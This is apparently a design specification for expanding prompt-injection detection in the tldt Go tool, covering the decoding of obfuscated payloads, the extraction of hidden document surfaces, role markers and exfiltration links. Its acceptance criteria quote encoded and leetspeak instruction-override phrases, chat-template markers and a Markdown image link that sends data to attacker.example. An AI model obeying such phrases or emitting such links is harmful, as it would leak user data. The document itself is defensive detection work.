# Specification: Expanded Prompt-Injection Detection

Derived from `GRILL.md` (resolved decisions 1–11). This document defines what the
expanded detection surface does, not how it is built.

## Problem

tldt sits between untrusted text and an LLM's context window, and its detection
layer currently reports only that obfuscated content is *present* — never what that
content says. `DetectEncoding` flags a base64 blob at a fixed score of 0.75 and
stops; `DetectPatterns` never sees the decoded plaintext. A shared entropy
threshold, tuned for secret material and reused for injection payloads, makes any
encoded token under 23 characters mathematically undetectable. Meanwhile the
document extractors reach only metadata for PDF and XLSX, so a PDF's actual
injection vectors — annotation contents and white or 1pt content-stream text — are
never read at all. The result is a detector that produces low-confidence advisories
an operator cannot act on, and that misses whole classes of planted payload. This
specification defines the coverage needed to turn presence signals into evidence.

## Scope

**In scope**

- Decoding obfuscated payloads and re-running detection on the decoded plaintext.
- Widening the recognised encoding set (base64 variants, base32, hex and escape
  forms, percent-encoding, HTML entities, Unicode Tags block, ROT13/Caesar,
  reversed text, zero-width binary, leetspeak folding).
- Deepening hidden-surface extraction for HTML, PDF, DOCX and XLSX; adding PPTX.
- Generic detection of visually hidden text via differential extraction.
- Additional input file formats: `.ipynb`, Markdown, EPUB, `.eml`, standalone SVG,
  image EXIF/IPTC.
- Semantic detection layers: chat-template and role markers, Markdown exfiltration
  constructs, positional and structural heuristics, language mismatch.
- Verdict aggregation across layers, and per-mode layer defaults.

**Out of scope**

- Scanning model *output* before it reaches the user or terminal. Decision 9
  deliberately defers this; it is a separate product surface with a different
  threat model and different hook plumbing.
- Blocking, refusing, or rewriting input. Detection remains advisory, consistent
  with the stated philosophy in `internal/detector`.
- Any network call, remote classifier, or model inference during detection.
- OCR of rasterised text in PDFs or images.
- Changes to summarization algorithms or their output.

## Users

- **Agent operators** running tldt as a `UserPromptSubmit` hook. They need untrusted
  prompt content screened on every turn without a false-positive rate that trains
  them to ignore the advisory.
- **Developers** invoking the CLI on documents and URLs before pasting them into an
  agent. They need maximum coverage and an explanation of what was found and where.
- **Library consumers** importing `pkg/tldt`. They need the new signals available
  through the existing `Detect` and `Pipeline` calls without a breaking API change.
- **Security reviewers** auditing a corpus of documents. They need each finding to
  identify the surface, the encoding chain, and the original byte offset.

## Functional Requirements

### Decoding and encodings

**FR-1:** The system SHALL decode encoded candidate tokens and re-run
`DetectPatterns` and `DetectPII` against the decoded text.

**FR-2:** The system SHALL report a decode-derived finding with the decoded content
as its excerpt and the encoding chain as provenance, expressed as a
`>`-delimited string (for example `base64>utf8`).

**FR-3:** On the injection detection path, the system SHALL NOT apply an entropy
threshold to encoded candidates, SHALL accept candidate tokens of 8 characters or
more, and SHALL emit a finding only when the decoded output is at least 6 bytes
long, consists of at least 85% printable characters (U+0020–U+007E plus tab,
newline, carriage return), AND matches a pattern.

**FR-4:** On the PII detection path, the system SHALL retain the existing
`entropy > 4.5` gate, and PII redaction output SHALL be byte-identical to the
current implementation for all existing test inputs.

**FR-5:** The system SHALL decode the following Tier 1 encodings:
- FR-5.a: base64 with the URL-safe alphabet (`-`, `_`).
- FR-5.b: base64 without padding.
- FR-5.c: hexadecimal strings, `\xNN` escapes, and `\uNNNN` escapes.
- FR-5.d: percent-encoding.
- FR-5.e: HTML entities, both decimal (`&#105;`) and hexadecimal (`&#x69;`).
- FR-5.f: Unicode Tags block (U+E0000–U+E01FF) reconstructed to ASCII by
  subtracting 0xE0000.

**FR-6:** The system SHALL decode the following Tier 2 encodings:
- FR-6.a: ROT13 and other Caesar shifts.
- FR-6.b: reversed strings.
- FR-6.c: base32.
- FR-6.d: zero-width character binary encoding.

**FR-7:** The system SHALL fold leetspeak and character substitutions into a
throwaway copy of the text used only for pattern matching.

**FR-8:** A finding that matches only after folding SHALL carry the pattern name
`injection-obfuscated`, SHALL score below any equivalent literal match, and SHALL
NOT be assigned the `encoding` category.

**FR-9:** Every finding SHALL quote original source bytes in its excerpt and report
the original byte offset, regardless of any decoding or folding applied to produce
the match.

**FR-10:** Folded or decoded text SHALL NOT be passed to the summarizer, the
formatter, or any output path other than finding provenance.

**FR-11:** The decoder SHALL enforce all of the following bounds:
- FR-11.a: a maximum of 3 decode levels per chain.
- FR-11.b: abort a chain when cumulative decoded output exceeds 10x the encoded
  token length.
- FR-11.c: abort a chain when cumulative decoded output exceeds 1 MB.
- FR-11.d: abort all further decoding once total decoded bytes for the document
  exceed 4 MB.

**FR-12:** Decoding SHALL be applied to text recovered from hidden document
surfaces, not only to the primary document body.

### Document surfaces

**FR-13:** The system SHALL extract the following additional PDF surfaces:
annotation contents (`/Annot`), AcroForm field values, and content-stream text
rendered at a font size below 4.0 points or in a fill colour within 3% of the
page background on each channel.

**FR-14:** The system SHALL extract the following additional DOCX surfaces:
footnotes, endnotes, headers, footers, textbox content (`w:txbxContent`),
tracked-change deletions (`w:del`), and `docProps/custom.xml`.

**FR-15:** The system SHALL extract the following additional XLSX surfaces: hidden
rows, hidden columns, hidden and `veryHidden` sheets, defined names, and
`xl/threadedComments`.

**FR-16:** The system SHALL extract the following additional HTML surfaces: text
hidden by CSS, and JSON-LD script blocks.

**FR-17:** The system SHALL extract PPTX speaker notes as hidden surfaces.

**FR-18:** The system SHALL identify visually hidden text by differential
extraction: the set difference between all text present in the file and the text
produced by the normal reader path for that format.

**FR-19:** The system SHOULD supplement differential extraction with enumerated
heuristics for `display:none`, `visibility:hidden`, `opacity:0`, computed font
size below 4.0 points (approximately 5.3 CSS pixels), off-screen positioning, and
fill colour within 3% of the background, so that a finding can state a reason.

**FR-20:** The system SHOULD extract hidden surfaces from the following additional
formats: `.ipynb` (cell metadata and stored outputs), Markdown (front-matter and
HTML comments), EPUB, `.eml`, standalone SVG, and image EXIF/IPTC metadata.

### Semantic layers

**FR-21:** The system SHALL detect chat-template and role markers in untrusted
text, including at minimum `<|im_start|>`, `[INST]`, `<s>`, `### Human:`,
`Assistant:`, `System:`, `</system>`, fabricated `<function_calls>` and tool-result
blocks, and unbalanced code-fence or XML-tag closures.

**FR-22:** The system SHALL detect Markdown exfiltration constructs in input and
report them under a new `exfil` category. Detection SHALL key on link structure
rather than host identity: a link or image URL is flagged when its query string,
fragment, or path carries a value matching an encoded-data or template shape
(base64-like runs, percent-encoded blocks, or `{{...}}` / `${...}` interpolation).
No host allowlist SHALL be required, and an ordinary link bearing no such value
SHALL NOT be flagged.

**FR-23:** The system SHOULD detect positional and structural signals: instruction
text following a large whitespace gap, instruction text in the final region of a
document, and many-shot repetition of question-and-answer blocks.

**FR-24:** The system SHOULD detect sentences whose dominant Unicode script
differs from the document's dominant script, using `unicode` range tables only.
The system SHALL NOT claim to perform language identification, which no shipped
data supports.

### Aggregation and defaults

**FR-25:** The system SHALL mark a report `Suspicious` when `MaxScore` exceeds
`DefaultDetectionThreshold`, preserving current behaviour.

**FR-26:** The system SHALL additionally mark a report `Suspicious` when two or
more distinct detection layers each produce a finding scoring at or above an
exported `CorroborationFloor` constant, initially 0.5. The constant SHALL be
covered by a calibration test in the manner of the existing
`TestOutlierThresholdCalibration`, so the value is verified rather than asserted.

**FR-27:** Multiple findings originating from the same detection layer SHALL NOT
satisfy FR-26.

**FR-28:** In `--hook-output` mode the system SHALL enable, by default, the decoder
(Tiers 1 and 2), role and template markers, existing patterns, and document surface
extraction.

**FR-29:** In `--hook-output` mode the system SHALL disable, by default, positional
heuristics, language-mismatch detection, and leetspeak folding, and SHALL provide a
flag or configuration key to enable each.

**FR-30:** In CLI mode all detection layers SHALL be enabled by default.

### Performance and staging

**FR-31:** The pattern-matching pass SHALL be restructured as follows:
- FR-31.a: the input SHALL be lowercased once and patterns compiled without the
  `(?i)` flag, rather than each pattern performing its own case folding.
- FR-31.b: a rare-literal anchor prefilter SHALL run before the regex pass, and
  the regex pass SHALL be skipped entirely when no anchor is present.
- FR-31.c: every pattern in `injectionPatterns` SHALL be covered by at least one
  anchor, verified by test, so the prefilter cannot silently suppress a pattern.
- FR-31.d: combined regex alternation SHALL NOT be used. It was prototyped and
  measured at 128.8 ms against a 97.6 ms baseline — Go's RE2 engine cannot factor
  a 30-way alternation of complex patterns and degrades instead.

**FR-33:** The outlier detection pass SHALL be capped at 400 sentences. Above that
count the system SHALL either sample 400 sentences or skip the outlier layer, and
SHALL state in the report which occurred. The existing 2000-sentence cap SHALL NOT
govern this pass.

**FR-32:** Detection SHALL run on the original input bytes. All mutating stages
(`--sanitize`, `--sanitize-pii`, `--from-html`) SHALL execute after detection, on
the path toward the summarizer only, so that no detector can be denied evidence by
a normalization step.

## Non-Functional Requirements

**NFR-1 — Latency:** Full detection of a 256 KB input SHALL complete at P99 within
150 ms on a single core of a current-generation laptop CPU, measured by benchmark
in CI.

> **Measured baseline (Apple M5).** `Analyze` only — patterns, encoding,
> confusables: 256 KB = 112.3 ms (patterns 101.8, encoding 12.5, confusables 1.6),
> 32 KB = 14.1 ms; linear in input size.
>
> Full `Detect`, including the outlier pass: 2 KB = 1.6 ms, 4 KB = 2.8 ms,
> 8 KB = 5.5 ms, 16 KB = 16.2 ms, 32 KB = 57.6 ms, 64 KB = 199 ms,
> 128 KB = 737 ms, 256 KB = 2873 ms. Doubling ratios of 3.4–3.9x confirm O(n²)
> in the similarity matrix; quadratic cost only dominates above roughly 8 KB.
>
> NFR-1 is therefore reachable only with both FR-31 (pattern pass) and FR-33
> (outlier cap) in place. Without FR-33 the 256 KB figure is 2.87 s — 19x the
> budget — and no amount of pattern optimization closes that gap.

**NFR-2 — Hook latency:** `--hook-output` mode SHALL complete at P99 within 15 ms
for inputs up to 16 KB, which covers the observed range of agent prompts.

> Measured: 2 KB = 1.6 ms, 4 KB = 2.8 ms, 8 KB = 5.5 ms, 16 KB = 16.2 ms. The
> original target (50 ms at 32 KB) was set at the wrong input size — 32 KB measures
> 57.6 ms and was already unmet. Prompts in that range are rare; the 16 KB bound is
> both tighter and honest.

**NFR-3 — Memory:** Peak additional heap attributable to decoding SHALL NOT exceed
the FR-11 budget of 4 MB per document, independent of input adversariality.

**NFR-4 — Determinism:** Detection output SHALL be a pure function of input bytes
and configuration. No wall-clock deadline, randomness, or machine-load dependency
may alter which findings are produced.

**NFR-5 — Offline:** Detection SHALL make no network call. The existing `--url`
fetch path is the only network operation in the tool and is unchanged.

**NFR-6 — Backward compatibility:** The exported signatures in `pkg/tldt` SHALL
remain source-compatible. New fields MAY be added to `Finding`, `Report`, and
`DetectOptions`; existing fields SHALL NOT change type or meaning.

**NFR-7 — False positives:** The existing false-positive corpus
(`internal/detector/false_positive_test.go`) SHALL produce zero `Suspicious`
verdicts with hook-mode defaults.

**NFR-8 — Data retention:** No detection input, excerpt, or finding is persisted.
`internal/usage` remains counts-only, consistent with its current contract.

## Interfaces

**CLI** — existing flags retain their meaning. New surface:

- `--decode` / `--no-decode` — enable or disable payload decoding (default on).
- `--detect-exfil` — report Markdown exfiltration constructs.
- `--detect-positional` — enable positional and structural heuristics.
- `--detect-language-mismatch` — enable language-mismatch detection.
- `--fold-obfuscation` — enable leetspeak folding.
- Existing `--detect-injection`, `--detect-only`, `--hook-output`,
  `--injection-threshold` are unchanged in name and meaning.

**Configuration** — `~/.tldt.toml`, `[security]` section, one key per new layer,
mirroring the existing `SecurityConfig` pattern.

**Library** — `pkg/tldt`:

- `Detect(text, DetectOptions)` gains layer-toggle fields on `DetectOptions`.
- `Finding` gains a provenance field carrying the encoding chain and the surface
  source, and `Category` gains the `exfil` value.
- `Pipeline` and `Analyze` route the new layers with no signature change.

**External systems** — Claude Code, Codex, Cursor and OpenCode hook and skill
integrations via `internal/installer`. The advisory envelope format emitted by
`--hook-output` is unchanged; only its trigger conditions and content change.

**Data formats at boundaries** — stdin/file/URL text in; findings out as
human-readable stderr lines, or JSON when `--format json` is set. Document input:
HTML, PDF, DOCX, XLSX, and per FR-17 and FR-20, PPTX, `.ipynb`, Markdown, EPUB,
`.eml`, SVG, and images.

## Constraints

- Go 1.26.2, module `github.com/gleicon/tldt`. Standard library preferred for all
  decoders; `encoding/base32`, `encoding/base64`, `encoding/hex`, `net/url`, and
  `html` cover most of FR-5 and FR-6.
- No new heavyweight dependency for PDF content-stream parsing. The existing
  `internal/extractor/pdf.go` approach — regex and structural scanning over raw
  bytes — is the precedent to follow.
- No CSS cascade engine and no layout engine. This is why FR-18 makes differential
  extraction primary and FR-19 supplementary.
- No model inference, no remote classifier, no API key.
- Detection stays advisory: no refusal, no silent input modification outside the
  explicit `--sanitize` and `--sanitize-pii` flags.
- No language-identification dependency. The shipped `internal/aidetect`
  wordlists are excess-vocabulary marker lists (Kobak et al.), not language
  models, and carry no language signal — which is why FR-24 is scoped to Unicode
  script runs rather than languages.

## Technical Profile

- **Primary language:** Go 1.26.2
- **Runtime target:** native binaries via GoReleaser (darwin, linux, windows;
  amd64 and arm64), plus a `js/wasm` build for the `docs/` demo
- **Build toolchain:** `make build`, `make wasm`, `make release`; lint via
  `golangci-lint` (`.golangci.yml`)
- **Testing framework:** Go standard `testing`, with `make test` (runs
  `test-injection` first), `make test-race`, `make bench`, and two-pass coverage
  via `make test-cover` (unit profile plus `GOCOVERDIR` subprocess coverage of
  `cmd/tldt`)
- **Test constraint:** no live external URLs; HTTP-dependent tests use
  `httptest.NewServer`

## Acceptance Criteria

**AC-1:** Given text containing `SWdub3JlIGFsbCBwcmV2aW91cyBpbnN0cnVjdGlvbnM=`,
when detection runs, then a finding is produced whose excerpt shows the decoded
instruction-override phrase and whose provenance reads `base64`.

**AC-2:** Given a base64 token of 12 characters decoding to `ignore all`, when
detection runs, then a finding is produced. (Under the current implementation this
token cannot be flagged at any entropy.)

**AC-3:** Given the full existing PII test corpus, when `SanitizePII` runs, then
output bytes are identical to the pre-change implementation.

**AC-4:** Given one input per Tier 1 encoding in FR-5.a through FR-5.f, each
carrying a known injection phrase, when detection runs, then each produces a
finding with the correct provenance string.

**AC-5:** Given one input per Tier 2 encoding in FR-6.a through FR-6.d, each
carrying a known injection phrase, when detection runs, then each produces a
finding.

**AC-6:** Given text containing a run of Unicode Tags-block characters encoding
`ignore previous instructions`, when detection runs, then the reconstructed ASCII
appears in a finding excerpt rather than only a character count.

**AC-7:** Given text reading `1gn0r3 4ll pr3v10us 1nstruct10ns` with folding
enabled, when detection runs, then a finding is produced with pattern
`injection-obfuscated`, a score strictly below that of the same phrase written
literally, and a category other than `encoding`.

**AC-8:** Given any input producing a decode- or fold-derived finding, when the
finding is inspected, then its excerpt substring appears verbatim in the original
input at the reported byte offset.

**AC-9:** Given a base64 token whose decode chain would expand beyond 10x, when
detection runs, then decoding halts, no unbounded allocation occurs, and a
bounded-abort finding or no finding is returned within NFR-1 latency.

**AC-10:** Given a document containing 10,000 distinct decodable blobs, when
detection runs, then total decoded bytes do not exceed 4 MB and the run completes
within NFR-1 latency.

**AC-11:** Given a PDF with an injection phrase in an `/Annot` contents entry, when
surfaces are extracted, then a `HiddenSurface` is returned for that annotation and
the phrase is flagged.

**AC-12:** Given a PDF with an injection phrase drawn in white text, when surfaces
are extracted, then the phrase is reported as a hidden surface.

**AC-13:** Given a DOCX with an injection phrase in a footnote, a header, a
textbox, and a tracked deletion, when surfaces are extracted, then each location
yields a distinct `HiddenSurface`.

**AC-14:** Given an XLSX with an injection phrase in a `veryHidden` sheet and
another in a hidden column, when surfaces are extracted, then both are reported.

**AC-15:** Given an HTML document with an injection phrase inside a
`display:none` div and another inside a JSON-LD block, when surfaces are
extracted, then both are reported.

**AC-16:** Given a PPTX with an injection phrase in speaker notes, when surfaces
are extracted, then the phrase is reported.

**AC-17:** Given an HTML document hiding text by a technique not in the FR-19
enumeration (for example `clip-path: inset(100%)`), when surfaces are extracted,
then differential extraction still reports the text.

**AC-18:** Given a benign document whose reader path strips navigation chrome, when
detection runs with hook defaults, then no finding is emitted for that chrome.

**AC-19:** Given text containing `<|im_start|>system` or `### Human:`, when
detection runs, then a role-marker finding is produced.

**AC-20:** Given a Markdown document containing
`![](http://attacker.example/?d=data)`, when detection runs with `--detect-exfil`,
then a finding is produced under the `exfil` category.

**AC-21:** Given a document containing a positional signal and a
language-mismatched sentence and an obfuscated pattern hit, each scoring at least
0.5, when detection runs in CLI mode, then the report is marked `Suspicious`.

**AC-22:** Given a document producing ten positional findings and nothing else,
when detection runs, then the report is NOT marked `Suspicious`.

**AC-23:** Given `--hook-output` mode and an input that would trigger only
positional, language-mismatch, or folding layers, when detection runs, then no
advisory envelope is emitted.

**AC-24:** Given the corpus in `false_positive_test.go`, when detection runs with
hook defaults, then zero reports are marked `Suspicious`.

**AC-25:** Given the same input run twice on differently loaded machines, when
outputs are compared, then the finding sets are identical.

**AC-26:** Given the current `pkg/tldt` example programs in `examples/`, when
compiled against the new version, then they build without modification.

**AC-27:** Given an HTML comment containing a base64-encoded injection phrase, when
detection runs, then the phrase is decoded and flagged, demonstrating that
extraction and decoding compose.

**AC-28:** Given a 256 KB adversarial input, when the CI benchmark runs, then P99
wall time is at or below 150 ms.

**AC-29:** Given a 256 KB corpus containing no anchor literal, when the pattern
pass runs, then it completes within 5 ms (prototype measured 1.39 ms; baseline
97.6 ms).

**AC-29.a:** Given a 256 KB corpus containing at least one anchor literal, when the
pattern pass runs, then it completes within 55 ms (prototype measured ~50 ms).

**AC-30:** Given the pattern set with 10 additional patterns appended, when the
256 KB anchor-free benchmark runs, then scan time increases by no more than 5%
relative to the unmodified set.

**AC-30.a:** Given every pattern in `injectionPatterns`, when the anchor coverage
test runs, then each pattern has at least one anchor literal that matches a string
the pattern matches.

**AC-43:** Given a 256 KB input producing more than 400 sentences, when detection
runs, then the outlier pass processes at most 400 sentences, the report states
whether sampling or skipping occurred, and full `Detect` completes within 150 ms.

**AC-31:** Given an English document containing one sentence written predominantly
in Cyrillic, when detection runs with script-mismatch enabled, then that sentence
is flagged.

**AC-32:** Given input carrying a Unicode Tags-block payload and `--sanitize` set,
when detection runs, then the reconstructed payload is still reported — proving
detection precedes sanitization.

**AC-33:** Given a document containing `[docs](https://example.com/guide)` and
`![](https://host.example/?d=aWdub3Jl)`, when detection runs with `--detect-exfil`,
then exactly one `exfil` finding is produced, for the second link.

**AC-34:** Given an `.ipynb` file with an injection phrase in cell metadata and
another in a stored cell output, when surfaces are extracted, then both are
reported.

**AC-35:** Given a Markdown file with an injection phrase in YAML front-matter and
another in an HTML comment, when surfaces are extracted, then both are reported.

**AC-36:** Given an EPUB with an injection phrase in OPF metadata, when surfaces
are extracted, then it is reported.

**AC-37:** Given an `.eml` file with an injection phrase in a non-displayed header
and another in a `text/html` alternative part, when surfaces are extracted, then
both are reported.

**AC-38:** Given a standalone SVG with an injection phrase in `<title>`, `<desc>`,
and a `<metadata>` block, when surfaces are extracted, then each is reported.

**AC-39:** Given a JPEG with an injection phrase in an EXIF `ImageDescription` or
IPTC caption field, when surfaces are extracted, then it is reported.

**AC-40:** Given the false-positive corpus, when the corroboration rule runs at
`CorroborationFloor`, then zero reports are marked `Suspicious` by corroboration,
asserted by a calibration test.

**AC-41:** Given detection running on any input with no `--url` flag, when the
process is observed, then no network syscall is issued.

**AC-42:** Given a run that produces findings, when `~/.tldt/usage.jsonl` is
inspected, then it contains counts and timestamps only, with no excerpt, finding
text, or input fragment.

### Coverage

| Requirement | Verified by |
|---|---|
| FR-1 | AC-1, AC-4, AC-27 |
| FR-2 | AC-1, AC-4 |
| FR-3 | AC-2, AC-4 |
| FR-4 | AC-3 |
| FR-5 | AC-4, AC-6 |
| FR-6 | AC-5 |
| FR-7 | AC-7 |
| FR-8 | AC-7 |
| FR-9 | AC-8 |
| FR-10 | AC-8, AC-26 |
| FR-11 | AC-9, AC-10 |
| FR-12 | AC-27 |
| FR-13 | AC-11, AC-12 |
| FR-14 | AC-13 |
| FR-15 | AC-14 |
| FR-16 | AC-15 |
| FR-17 | AC-16 |
| FR-18 | AC-17, AC-18 |
| FR-19 | AC-12, AC-15 |
| FR-20 | AC-34, AC-35, AC-36, AC-37, AC-38, AC-39 |
| FR-21 | AC-19 |
| FR-22 | AC-20, AC-33 |
| FR-23 | AC-21, AC-22 |
| FR-24 | AC-31 |
| FR-25 | AC-24 |
| FR-26 | AC-21, AC-40 |
| FR-27 | AC-22 |
| FR-28 | AC-23, AC-24, AC-27 |
| FR-29 | AC-23 |
| FR-30 | AC-21 |
| FR-31 | AC-29, AC-29.a, AC-30, AC-30.a |
| FR-33 | AC-43 |
| FR-32 | AC-32 |
| NFR-1 | AC-28, AC-29, AC-43 |
| NFR-2 | AC-28 |
| NFR-3 | AC-10 |
| NFR-4 | AC-25 |
| NFR-5 | AC-41 |
| NFR-6 | AC-26 |
| NFR-7 | AC-24 |
| NFR-8 | AC-42 |

## Open Questions

None outstanding. Both questions carried from the first draft were resolved by
measurement, and one of them overturned a decision recorded in this spec.

### Resolved by measurement

- **Pattern-pass target.** The 25 ms figure was replaced by a two-tier bound after
  prototyping. Combined alternation — the approach FR-31 originally named — was
  measured 32% *slower* than the baseline and is now explicitly forbidden by
  FR-31.d. Dropping `(?i)` in favour of a single lowercase halves the cost
  (97.6 → 48.6 ms); a rare-literal anchor prefilter takes anchor-free input to
  1.39 ms.
- **Outlier pass cost.** Measured at 2.76 s for 256 KB, with doubling ratios
  confirming O(n²). This is 19x NFR-1 and cannot be optimized away, so FR-33 caps
  the pass at 400 sentences.
- **Hook latency target.** NFR-2 was unmet as written (57.6 ms at 32 KB against a
  50 ms bound). Re-anchored to 15 ms at 16 KB, which matches real prompt sizes and
  is met with headroom.

### Resolved during specification

- **Corroboration floor** — retained at 0.5, promoted to an exported constant with
  a calibration test (FR-26, AC-40).
- **Exfil host allowlist** — eliminated. FR-22 keys on link structure, not host.
- **Printable ratio** — fixed at 85% over at least 6 decoded bytes (FR-3).
- **FR-20 acceptance criteria** — written (AC-34 through AC-39); no spec split.
- **Small-font threshold** — fixed at 4.0 points, with a 3% background-colour
  tolerance (FR-13, FR-19).
- **Language mismatch** — narrowed to Unicode script-run mismatch; the `aidetect`
  wordlists carry no language signal (FR-24).
- **Sanitize versus detect ordering** — detection moved ahead of all mutating
  stages (FR-32). Hook mode was already unaffected, as it never sanitizes.
